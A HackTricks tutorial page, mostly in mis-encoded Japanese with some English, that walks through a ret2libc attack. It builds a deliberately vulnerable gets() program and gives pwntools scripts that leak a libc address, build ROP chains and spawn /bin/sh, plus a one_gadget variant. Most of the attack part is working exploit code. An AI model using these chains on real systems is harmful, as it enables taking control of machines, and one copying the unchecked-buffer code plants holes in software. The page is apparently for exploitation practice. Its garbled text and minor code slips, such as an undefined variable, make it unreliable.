<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>


# ã‚¯ã‚¤ãƒƒã‚¯ãƒªã‚µãƒ¼ãƒ 

1. **ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆ**ã‚’è¦‹ã¤ã‘ã‚‹
2. `POP_RDI`ã€`PUTS_PLT`ã€`MAIN_PLT`ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹
3. å‰è¿°ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€putsã‚„ä»–ã®libcé–¢æ•°ã®ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’**ãƒªãƒ¼ã‚¯**ã—ã€libcãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’**è¦‹ã¤ã‘ã‚‹**ï¼ˆ[ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰](https://libc.blukat.me)ï¼‰
4. ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ã€ROPã‚’è¨ˆç®—ã—ã€ãã‚Œã‚’æ‚ªç”¨ã™ã‚‹

# ä»–ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã¨ç·´ç¿’ç”¨ã®ãƒã‚¤ãƒŠãƒª

ã“ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ã¯ã€ã“ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã§ææ¡ˆã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰/ãƒã‚¤ãƒŠãƒªã‚’æ‚ªç”¨ã—ã¾ã™ï¼š[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
ä»–ã®ä¾¿åˆ©ãªãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ï¼š[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)ã€[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# ã‚³ãƒ¼ãƒ‰

ãƒ•ã‚¡ã‚¤ãƒ«åï¼š`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - LIBCã‚¢ãƒ‰ãƒ¬ã‚¹æ¼æ´©ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ

ã“ã“ã«ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚\
ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€è„†å¼±æ€§ã®ã‚ã‚‹ãƒã‚¤ãƒŠãƒªã¨åŒã˜ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«é…ç½®ã—ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«å¿…è¦ãªãƒ‡ãƒ¼ã‚¿ã‚’æä¾›ã—ã¾ã™ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- ã‚ªãƒ•ã‚»ãƒƒãƒˆã®æ¤œç´¢

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ç¶šè¡Œã™ã‚‹å‰ã«ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯ã‚ªãƒ•ã‚»ãƒƒãƒˆãŒå¿…è¦ã§ã™ã€‚æä¾›ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãã‚Œã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«å¿…è¦ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ `OFFSET = ""`ï¼‰ã€‚
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**å®Ÿè¡Œ** `python template.py` ã¨ã™ã‚‹ã¨ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã—ãŸçŠ¶æ…‹ã§ **GDB ã‚³ãƒ³ã‚½ãƒ¼ãƒ«** ãŒé–‹ã‹ã‚Œã¾ã™ã€‚ãã® **GDB ã‚³ãƒ³ã‚½ãƒ¼ãƒ«** å†…ã§ `x/wx $rsp` ã‚’å®Ÿè¡Œã—ã¦ã€RIP ã‚’ä¸Šæ›¸ãã™ã‚‹ãƒã‚¤ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚æœ€å¾Œã«ã€**Python ã‚³ãƒ³ã‚½ãƒ¼ãƒ«**ã‚’ä½¿ç”¨ã—ã¦ **ã‚ªãƒ•ã‚»ãƒƒãƒˆ**ã‚’å–å¾—ã—ã¾ã™ï¼š
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

ã‚ªãƒ•ã‚»ãƒƒãƒˆï¼ˆã“ã®å ´åˆã¯40ï¼‰ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€ãã®å€¤ã‚’ä½¿ã£ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®OFFSETå¤‰æ•°ã‚’å¤‰æ›´ã—ã¾ã™ã€‚\
`OFFSET = "A" * 40`

åˆ¥ã®æ–¹æ³•ã¨ã—ã¦ã¯ã€GEFã‹ã‚‰ `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

# 2- ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¤œç´¢

æ¬¡ã«ã€ãƒã‚¤ãƒŠãƒªå†…ã§ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã€**ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹libcã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«putsã‚’å‘¼ã³å‡ºã—ã€å¾Œã§** **æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’èµ·å‹•ã™ã‚‹**ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ã€**putsé–¢æ•°**ãŒå¿…è¦ã§ã™ã€‚\
`MAIN_PLT`ã¯ã€**ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å†åº¦**åˆ©ç”¨ã™ã‚‹ãŸã‚ã«ã€1å›ã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³å¾Œã«**mainé–¢æ•°**ã‚’å†åº¦å‘¼ã³å‡ºã™ãŸã‚ã«å¿…è¦ã§ã™ï¼ˆç„¡é™ã®åˆ©ç”¨ãƒ©ã‚¦ãƒ³ãƒ‰ï¼‰ã€‚**å„ROPã®æœ€å¾Œã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å†åº¦å‘¼ã³å‡ºã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™**ã€‚\
**POP\_RDI**ã¯ã€å‘¼ã³å‡ºã•ã‚Œã‚‹é–¢æ•°ã«**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã‚’**æ¸¡ã™**ãŸã‚ã«å¿…è¦ã§ã™ã€‚

ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ã€å®Ÿè¡Œã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã™ã¹ã¦ã¯å®Ÿè¡Œä¸­ã«pwntoolsã«ã‚ˆã£ã¦è¦‹ã¤ã‘ã‚‰ã‚Œã¾ã™ã€‚

# 3- LIBCãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®æ¤œç´¢

ä»Šã¯ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**libc**ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹æ™‚ã§ã™ã€‚ãã®ãŸã‚ã«ã€**putsé–¢æ•°**ã®**ãƒ¡ãƒ¢ãƒªå†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’**ãƒªãƒ¼ã‚¯**ã—ã€ãã®å¾Œãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ã‚‹putsãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒã©ã®**ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã«ã‚ã‚‹ã‹ã‚’**æ¤œç´¢**ã—ã¾ã™ã€‚
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
ä»¥ä¸‹ã¯ã€å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®ä¸­ã§æœ€ã‚‚é‡è¦ãªè¡Œã§ã™:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
ã“ã‚Œã«ã‚ˆã‚Šã€**RIP** ã‚’**ä¸Šæ›¸ã**ã™ã‚‹ã¾ã§ã®ã„ãã¤ã‹ã®ãƒã‚¤ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™: `OFFSET`ã€‚\
æ¬¡ã«ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆ `POP_RDI` ã®**ã‚¢ãƒ‰ãƒ¬ã‚¹**ãŒè¨­å®šã•ã‚Œã€æ¬¡ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ (`FUNC_GOT`) ãŒ**RDI** ãƒ¬ã‚¸ã‚¹ã‚¿ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€`PUTS_GOT` ã®**ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’ãƒ¡ãƒ¢ãƒªå†…ã® puts é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒ `PUTS_GOT` ã«ã‚ˆã£ã¦æŒ‡ã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦**æ¸¡ã™**ãŸã‚ã§ã™ã€‚\
ãã®å¾Œã€`PUTS_PLT` ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ï¼ˆ**RDI** ã« `PUTS_GOT` ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼‰ã®ã§ã€puts ã¯ `PUTS_GOT` å†…ã®**å†…å®¹**ï¼ˆ**ãƒ¡ãƒ¢ãƒªå†…ã® puts é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹**ï¼‰ã‚’**èª­ã¿å–ã‚Š**ã€ãã‚Œã‚’**å‡ºåŠ›**ã—ã¾ã™ã€‚\
æœ€å¾Œã«ã€**main é–¢æ•°ãŒå†åº¦å‘¼ã³å‡ºã•ã‚Œ**ã€ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å†åº¦æ‚ªç”¨ã§ãã¾ã™ã€‚

ã“ã®æ–¹æ³•ã§ã€puts é–¢æ•°ã‚’**ã ã¾ã—ã¦**ã€**puts** é–¢æ•°ã®**ãƒ¡ãƒ¢ãƒªå†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹**ï¼ˆ**libc** ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã«ã‚ã‚‹ï¼‰ã‚’**å‡ºåŠ›**ã•ã›ã¾ã—ãŸã€‚ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã‚ã‹ã£ãŸã®ã§ã€**ã©ã® libc ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’èª¿ã¹ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (141).png>)

**ãƒ­ãƒ¼ã‚«ãƒ«**ãƒã‚¤ãƒŠãƒªã‚’**æ‚ªç”¨**ã—ã¦ã„ã‚‹ãŸã‚ã€**libc** ã®ã©ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ã¯**ã‚ã‚Šã¾ã›ã‚“**ï¼ˆ`/lib/x86_64-linux-gnu/libc.so.6`å†…ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’è¦‹ã¤ã‘ã‚Œã°ã‚ˆã„ï¼‰ã€‚\
ãŸã ã—ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®å ´åˆã¯ã€æ¬¡ã«èª¬æ˜ã™ã‚‹æ–¹æ³•ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

## 3.1- libc ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ¤œç´¢ï¼ˆ1ï¼‰

Web ãƒšãƒ¼ã‚¸ [https://libc.blukat.me/](https://libc.blukat.me) ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ¤œç´¢ã§ãã¾ã™ã€‚\
ã¾ãŸã€**libc** ã®ç™ºè¦‹ã•ã‚ŒãŸãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- libc ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ¤œç´¢ï¼ˆ2ï¼‰

æ¬¡ã®ã‚ˆã†ã«ã‚‚ã§ãã¾ã™ï¼š

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

ã“ã‚Œã«ã¯æ™‚é–“ãŒã‹ã‹ã‚‹ã®ã§ã€ãŠå¾…ã¡ãã ã•ã„ã€‚\
ã“ã‚Œã‚’æ©Ÿèƒ½ã•ã›ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚‚ã®ãŒå¿…è¦ã§ã™ï¼š

* Libc ã‚·ãƒ³ãƒœãƒ«å: `puts`
* ãƒªãƒ¼ã‚¯ã—ãŸ libc ã‚¢ãƒ‰ãƒ¬ã‚¹: `0x7ff629878690`

æœ€ã‚‚å¯èƒ½æ€§ã®é«˜ã„ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**libc**ã‚’ç‰¹å®šã§ãã¾ã™ã€‚
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
2ã¤ã®ãƒãƒƒãƒãŒã‚ã‚Šã¾ã™ï¼ˆæœ€åˆã®ã‚‚ã®ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã¯ã€2ç•ªç›®ã®ã‚‚ã®ã‚’è©¦ã—ã¦ãã ã•ã„ï¼‰ã€‚æœ€åˆã®ã‚‚ã®ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ï¼š
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
## 3.3- ãƒªãƒ¼ã‚¯ã™ã‚‹ãŸã‚ã®ãã®ä»–ã®é–¢æ•°

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` ã‹ã‚‰ libc ã‚’ä½œæ¥­ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
```python
puts
printf
__libc_start_main
read
gets
```
# 4- libcã‚¢ãƒ‰ãƒ¬ã‚¹ã®ç‰¹å®šã¨exploiting

ã“ã®æ™‚ç‚¹ã§ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹libcãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’çŸ¥ã£ã¦ã„ã‚‹ã¯ãšã§ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚¤ãƒŠãƒªã‚’exploitingã—ã¦ã„ã‚‹ã®ã§ã€å˜ã«æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:`/lib/x86_64-linux-gnu/libc.so.6`

ã—ãŸãŒã£ã¦ã€`template.py`ã®å†’é ­ã§ã€**libc**å¤‰æ•°ã‚’æ¬¡ã®ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ï¼š`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libcãƒ©ã‚¤ãƒ–ãƒ©ãƒª**ã¸ã®**ãƒ‘ã‚¹**ã‚’æŒ‡å®šã™ã‚‹ã¨ã€**exploitã®æ®‹ã‚Šã¯è‡ªå‹•çš„ã«è¨ˆç®—**ã•ã‚Œã¾ã™ã€‚

`get_addr`é–¢æ•°ã®ä¸­ã§ã€**libcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹**ãŒè¨ˆç®—ã•ã‚Œã¾ã™ï¼š
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**æœ€çµ‚çš„ãªlibcãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯00ã§çµ‚ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ãã†ã§ãªã„å ´åˆã€é–“é•ã£ãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒæ¼æ´©ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

æ¬¡ã«ã€`system`é–¢æ•°ã¸ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨æ–‡å­—åˆ—_"/bin/sh"_ã¸ã®**ã‚¢ãƒ‰ãƒ¬ã‚¹**ã¯ã€**libc**ã®**ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‹ã‚‰**è¨ˆç®—**ã•ã‚Œã€**ä¸ãˆã‚‰ã‚ŒãŸlibcãƒ©ã‚¤ãƒ–ãƒ©ãƒª**ã«ãªã‚Šã¾ã™ã€‚
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
æœ€å¾Œã«ã€/bin/sh å®Ÿè¡Œã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒæº–å‚™ã•ã‚Œé€ä¿¡ã•ã‚Œã‚‹äºˆå®šã§ã™:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
The last ROP (`rop1`) ended calling again the main function, then we can **exploit again** the **overflow** (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI` pointing to the **addres** of _"/bin/sh"_ (`BINSH`) and call **system** function (`SYSTEM`) because the address of _"/bin/sh"_ will be passed as a parameter.\
Finally, the **address of exit function** is **called** so the process **exists nicely** and any alert is generated.

**This way the exploit will execute a **_**/bin/sh**_** shell.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Using ONE\_GADGET

You could also use [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)to obtain a shell instead of using **system** and **"/bin/sh". ONE\_GADGET** will find inside the libc library some way to obtain a shell using just one **ROP address**. \
However, normally there are some constrains, the most common ones and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the **RSP** you just have to send some more NULL values so the constrain is avoided.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT FILE

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯ã“ã¡ã‚‰ã«ã‚ã‚Šã¾ã™:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# ä¸€èˆ¬çš„ãªå•é¡Œ

## MAIN\_PLT = elf.symbols\['main'] ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“

"main" ã‚·ãƒ³ãƒœãƒ«ãŒå­˜åœ¨ã—ãªã„å ´åˆã€mainã‚³ãƒ¼ãƒ‰ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’ç¢ºèªã§ãã¾ã™:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ãã—ã¦ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ‰‹å‹•ã§è¨­å®šã—ã¾ã™ï¼š
```python
MAIN_PLT = 0x401080
```
## PutsãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“

ãƒã‚¤ãƒŠãƒªãŒPutsã‚’ä½¿ç”¨ã—ã¦ã„ãªã„å ´åˆã¯ã€æ¬¡ã®ã“ã¨ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

ã“ã®**ã‚¨ãƒ©ãƒ¼**ãŒã™ã¹ã¦ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã—ãŸå¾Œã«è¦‹ã¤ã‹ã£ãŸå ´åˆ: `sh: 1: %s%s%s%s%s%s%s%s: not found`

"/bin/sh"ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰**64ãƒã‚¤ãƒˆã‚’æ¸›ç®—**ã—ã¦ã¿ã¦ãã ã•ã„:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
